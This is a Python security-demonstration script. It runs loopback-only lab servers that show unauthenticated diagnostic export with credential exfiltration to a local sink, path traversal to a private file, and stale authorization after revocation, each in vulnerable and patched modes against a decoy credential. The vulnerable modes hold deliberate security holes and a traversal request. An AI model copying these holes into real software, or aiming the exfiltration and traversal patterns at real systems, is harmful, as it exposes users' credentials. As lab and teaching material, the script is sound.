"""Disposable, loopback-only security demonstrations. No third-party dependencies.

These examples intentionally violate specific application policies in vulnerable
mode. They only operate on seeded temporary data. Never deploy as a service.
"""
from __future__ import annotations
import argparse
import datetime
import http.client
import http.server
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import threading
import uuid

LOCK = threading.Lock()

def event(kind, summary, parent="", trace="", severity="info", outcome="success", attrs=None, pid=None, ident=None):
    item = {"id": ident or uuid.uuid4().hex,
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="microseconds"),
            "kind": kind, "summary": summary, "severity": severity, "outcome": outcome,
            "source": "python-instrumentation", "pid": os.getpid() if pid is None else pid,
            "ppid": os.getppid(), "process": "demo-helper" if kind == "process" else "demo-api",
            "host": "demo-local", "trace_id": trace, "parent_id": parent,
            "attributes": attrs or {}}
    with LOCK:
        print(json.dumps(item), flush=True)
    return item["id"]

class QuietServer(http.server.HTTPServer):
    allow_reuse_address = False
    def get_request(self):
        conn, addr = super().get_request()
        conn.settimeout(5)
        return conn, addr

def child_export(path, port, parent, trace):
    data = Path(path).read_bytes()
    read = event("file", "Diagnostic helper reads a synthetic credential", parent, trace, "critical",
                 attrs={"path": "$FIXTURE/private/credential.txt", "operation": "read", "bytes": str(len(data)), "secret": data.decode()})
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
    try:
        conn.request("POST", "/collect", data)
        response = conn.getresponse()
        response.read()
        assert response.status == 204
        event("network", "Synthetic credential reaches the loopback collection sink", read, trace, "critical",
              attrs={"destination": "loopback://collection-sink/collect", "operation": "send", "bytes": str(len(data)), "payload": data.decode()})
    finally:
        conn.close()

def run(scenario, mode):
    patched = mode == "patched"
    with tempfile.TemporaryDirectory(prefix="breach-rewind-lab-") as temp:
        root = Path(temp)
        public = root / "public"
        public.mkdir()
        private = root / "private"
        private.mkdir()
        (public / "hello.txt").write_text("Public documentation", encoding="utf-8")
        secret = private / "credential.txt"
        secret.write_text("BR_DECOY_NEVER_A_REAL_CREDENTIAL", encoding="utf-8")
        received = []

        class Sink(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args): pass
            def do_POST(self):
                length = int(self.headers.get("Content-Length", "0"))
                if length > 4096:
                    self.send_error(413)
                    return
                received.append(self.rfile.read(length))
                self.send_response(204)
                self.end_headers()

        sink = QuietServer(("127.0.0.1", 0), Sink)
        sink_thread = threading.Thread(target=sink.serve_forever, daemon=True)
        sink_thread.start()
        member = {"active": True}
        cached_access = {"allowed": True}

        class App(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args): pass
            def do_GET(self):
                trace = uuid.uuid4().hex
                request = event("request", "HTTP " + self.path, trace=trace,
                                attrs={"method": "GET", "route": self.path})
                status, body, parent = 200, b"OK", request
                if self.path == "/health":
                    body = b"healthy"
                elif self.path == "/diagnostics/export" and scenario == "diagnostic-export":
                    if patched:
                        status, body = 403, b"diagnostic export requires an administrator"
                        parent = event("policy", "Unauthenticated diagnostic export denied", request, trace, outcome="blocked",
                                       attrs={"rule": "diagnostic-admin-required", "action": "export"})
                    else:
                        process_id = uuid.uuid4().hex
                        proc = subprocess.Popen([sys.executable, __file__, "--child", str(secret),
                                                 "--port", str(sink.server_port), "--parent", process_id,
                                                 "--trace", trace], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                text=True, encoding="utf-8")
                        parent = event("process", "Unauthenticated request starts the diagnostic helper", request, trace,
                                       "high", attrs={"operation": "spawn", "action": "diagnostic-export"},
                                       pid=proc.pid, ident=process_id)
                        try:
                            stdout, stderr = proc.communicate(timeout=10)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                            proc.communicate()
                            raise
                        if proc.returncode != 0:
                            raise RuntimeError("fixture helper failed: " + stderr[:1000])
                        with LOCK:
                            print(stdout, end="", flush=True)
                        body = b"export complete"
                elif self.path.startswith("/download/") and scenario == "path-traversal":
                    name = self.path[len("/download/"):]
                    candidate = (public / name).resolve()
                    # Outer lab boundary holds in BOTH modes. Only the public/private
                    # application boundary is intentionally broken in vulnerable mode.
                    if not candidate.is_relative_to(root.resolve()):
                        status, body = 403, b"outside lab"
                    elif patched and not candidate.is_relative_to(public.resolve()):
                        status, body = 403, b"outside public directory"
                        parent = event("policy", "Canonical path escapes the public directory", request, trace, outcome="blocked",
                                       attrs={"rule": "public-directory-boundary", "path": "$FIXTURE/private/credential.txt"})
                    else:
                        body = candidate.read_bytes()
                        sensitive = candidate == secret
                        parent = event("file", "Download reads " + ("a private fixture" if sensitive else "public documentation"),
                                       request, trace, "high" if sensitive else "info",
                                       attrs={"path": "$FIXTURE/" + candidate.relative_to(root).as_posix(), "operation": "read", "bytes": str(len(body))})
                elif self.path == "/member/revoke" and scenario == "stale-authorization":
                    member["active"] = False
                    parent = event("policy", "Fixture administrator revokes tenant membership", request, trace,
                                   attrs={"rule": "tenant-membership", "action": "revoke"})
                    body = b"revoked"
                elif self.path == "/tenant/export" and scenario == "stale-authorization":
                    allowed = member["active"] if patched else cached_access["allowed"]
                    if not allowed:
                        status, body = 403, b"membership was revoked"
                        parent = event("policy", "Fresh membership check blocks the revoked member", request, trace, outcome="blocked",
                                       attrs={"rule": "authorization-at-download", "action": "tenant-export"})
                    else:
                        body = secret.read_bytes()
                        parent = event("file", "Revoked member reads the tenant export", request, trace, "high",
                                       attrs={"path": "$FIXTURE/private/credential.txt", "operation": "read", "action": "tenant-export"})
                else:
                    status, body = 404, b"not found"
                self.send_response(status)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                event("response", "HTTP response " + str(status), parent, trace,
                      severity="info", outcome="blocked" if status == 403 else "success",
                      attrs={"method": "GET", "route": self.path, "status": str(status), "bytes": str(len(body))})

        app = QuietServer(("127.0.0.1", 0), App)
        thread = threading.Thread(target=app.serve_forever, daemon=True)
        thread.start()
        def request(path):
            conn = http.client.HTTPConnection("127.0.0.1", app.server_port, timeout=15)
            try:
                conn.request("GET", path)
                response = conn.getresponse()
                return response.status, response.read()
            finally:
                conn.close()
        try:
            assert request("/health") == (200, b"healthy"), "positive control failed"
            if scenario == "diagnostic-export":
                status, _ = request("/diagnostics/export")
                assert status == (403 if patched else 200)
                assert len(received) == (0 if patched else 1), "unexpected sink result"
            elif scenario == "path-traversal":
                assert request("/download/hello.txt") == (200, b"Public documentation")
                status, data = request("/download/../private/credential.txt")
                assert status == (403 if patched else 200)
                assert (b"BR_DECOY_" in data) is not patched
            elif scenario == "stale-authorization":
                assert request("/member/revoke")[0] == 200
                status, data = request("/tenant/export")
                assert status == (403 if patched else 200)
                assert (b"BR_DECOY_" in data) is not patched
            assert request("/health") == (200, b"healthy"), "post-test positive control failed"
        finally:
            app.shutdown(); app.server_close(); thread.join(timeout=5)
            sink.shutdown(); sink.server_close(); sink_thread.join(timeout=5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--scenario", choices=["diagnostic-export", "path-traversal", "stale-authorization"], default="diagnostic-export")
    parser.add_argument("--mode", choices=["vulnerable", "patched"], default="vulnerable")
    parser.add_argument("--child")
    parser.add_argument("--port", type=int)
    parser.add_argument("--parent", default="")
    parser.add_argument("--trace", default="")
    args = parser.parse_args()
    if args.child:
        child_export(args.child, args.port, args.parent, args.trace)
    else:
        run(args.scenario, args.mode)
